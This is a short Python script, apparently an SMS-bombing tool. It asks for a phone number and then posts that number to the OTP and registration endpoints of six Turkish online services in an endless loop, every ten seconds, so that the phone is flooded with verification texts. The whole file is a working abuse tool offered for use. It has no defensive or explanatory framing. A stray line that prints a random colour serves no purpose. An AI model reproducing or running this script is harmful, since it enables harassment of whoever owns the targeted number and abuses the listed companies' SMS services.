import requests
import random
import time

num = input("Please enter your phone number: ")
colors = ["red", "blue", "green"]

apis = [
    {'url': 'https://www.migros.com.tr/rest/users/login/otp', 'data': {"phoneNumber": num}},
    {'url': 'https://backend.gofody.com/api/v1/enduser/register/', 'data': {"country_code": "90", "phone": num}},
    {'url': 'https://fe.dominos.com.tr/api/customer/sendOtpCode', 'data': {"mobilePhone": num, "isSure": False}},
    {'url': 'https://api.kunduz.com/auth/login/otp/', 'data': {"phone_number": {"country_code": 1, "number": num}}},
    {'url': 'https://www.bisu.com.tr/api/v2/app/authentication/phone/register', 'data': {"phoneNumber": num}},
    {'url': 'https://www.alsatkitap.com/api/v2/phoneSignUp', 'data': {"phone": num}},
]

while True:
    for api in apis:
        try:
            response = requests.post(api['url'], json=api['data'])
            if response.ok:
                print(f"{api['url']} - Response: {response.text}")
            else:
                print(f"{api['url']} - Error: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"Failed: {api['url']} - Error: {str(e)}")

    print("Random color:", random.choice(colors))
    
    time.sleep(10)